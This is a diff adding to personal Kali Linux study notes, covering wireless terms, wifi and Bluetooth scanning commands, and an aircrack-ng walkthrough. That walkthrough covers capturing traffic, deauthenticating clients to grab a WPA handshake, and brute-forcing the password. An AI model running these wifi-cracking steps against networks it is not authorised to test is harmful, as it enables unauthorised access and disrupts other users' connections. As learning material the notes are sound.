@@ -470,3 +470,115 @@ Kali has a proxychain tool. For example,
 
 The traffic is encrypted. Also, IP address and location of where you are will change so that keep you anonymous. However, the device you connect record your information. Thus, anyone who is able to access the device can uncover your information. There are VPN services that don't record any logs. Using these services is the safest.  
 The strength of VPN is that all of your traffic is encrypted.
+
+## Encrypted email
+
+- Protonmail
+  your email is encrypted in Protonmail server and even the admin can't read the email.
+
+# Wireless networks
+
+## wifi networks
+
+- AP : access point
+- ESSID : extended service set identifier. Same as SSID.
+- BSSID : basic service set identifier. Same as the MAC address of the device.
+- SSID : service set identifier. The name of the network.
+- Security : WEP (sucks) < WPA (better) < WPA2-PSK (currently being used)
+- Modes : managed | master | monitor
+  - managed: ready to join (client)
+  - master : ready to act (server)
+  - monitor :
+
+### command for wifi interfaces
+
+```
+kali >iwconfig
+
+lo         no wireless extensions
+wlan0 IEEE 802.11bg     ESSID:off/ any             Mode:Managed     Access Point:Not-Associated       Tx-Power = 20 dBm             Retry short limit: 7       RTS     thr:off       Fragment thr:off             Encryption key:off             Power Management:off
+eth0     no wireless extensions
+```
+
+```
+kali >iwlist wlan0 scan
+
+wlan0               Scan completed:                        
+Cell 01 - Address: 88: AD: 43: 75: B3: 82                                            
+Channel: 1                                            
+Frequency: 2.412GHz (Channel 1)                                            
+Quality = 70/ 70       Signal level =-38 dBm                                            
+Encryption key:off                                            
+ESSID:" Hackers-Arise"
+```
+
+The one we often see from wifi icon.
+
+```
+kali > nmcli dev wifi *    SSID                       MODE         CHAN     RATE                       SIGNAL     BARS         SECURITY      
+Hackers-Arise     Infra       1           54 Mbits/ s           100                           WPA1 WPA2       Xfinitywifi         Infra       1           54 Mbits/ s           75                             WPA2       TPTV1                     Infra       11         54 Mbits/ s           44                             WPA1 WPA2
+```
+
+To connect to an AP.  
+`nmcli dev wifi connect AP-SSID password APpassword`  
+`kali > nmcli dev wifi connect Hackers-Arise password 12345678`
+
+### aircrack-ng
+
+- To put wireless network in monitor mode, use the airmon-ng command.  
+  `kali >airmon-ng start wlan0`  
+  In the monitor mode, it can access all the wireless traffic. And your wireless interface will get a new name.
+- To find key data from the wireless traffic.
+  `kali >airodump-ng wlan0mon`  
+  Capture all packets on channel 10.  
+  `airodump-ng -c 10 --bssid 01: 01: AA:BB:CC: 22 -w Hackers-ArisePSK wlan0mon`  
+  Disconnect the connection and make it re-authenticat to capture hash.
+  `aireplay-ng --deauth 100 -a 01: 01: AA:BB:CC: 22-c A0: A3: E2: 44: 7C:E5 wlan0mon`  
+  Finally brute force the password using password lists.  
+  `aircrack-ng -w wordlist.dic -b 01: 01: AA:BB:CC: 22 Hacker-ArisePSK.cap`
+
+## Bluetooth
+
+### blueZ
+
+- Scanning for a bluetooth device.
+
+```
+kali > hciconfig hci0: Type: BR/ EDR     Bus: USB            
+BD Address: 10: AE: 60: 58: F1: 37     ACL     MTU: 310: 10     SCO     MTU:     64: 8            
+UP RUNNING PSCAN INQUIRY             RX bytes: 131433 acl: 45 sco: 0 events: 10519     errors: 0            
+TX bytes: 42881     acl: 45 sco: 0 commands: 5081 errors: 0
+```
+
+- Checking whether the connection is enabled.  
+  `kali >hciconfig hci0 up`  
+  It no output is displayed, it is ready to connect.
+- Scanning other bluetooth devices.
+
+```
+kali >hcitool scan
+
+scanning...
+72: 6E: 46: 65: 72: 66             ANDROID BT            
+22: C5: 96: 08: 5D: 32             SCH-I535
+```
+
+- Getting more information of discovered device.
+
+```
+kali > hcitool inq Inquiring...        
+24: C6: 96: 08: 5D: 33         clock offset: 0x4e8b             class: 0x5a020c        
+76: 6F: 46: 65: 72: 67         clock offset: 0x21c0             class: 0x5a020c
+```
+
+The class indicates a type of bluetooth you found.
+
+- Seeing whether a device is reachable.
+
+```
+kali > l2ping 76: 6E: 46: 63: 72: 66 -c 4
+Ping: 76: 6E: 46: 63: 72: 66 from 10: AE: 60: 58: F1: 37 (data size 44)...
+44 bytes 76: 6E: 46: 63: 72: 66 id 0 time 37.57ms
+44 bytes 76: 6E: 46: 63: 72: 66 id 1 time 27.23ms
+44 bytes 76: 6E: 46: 63: 72: 66 id 2 time 27.59ms
+```
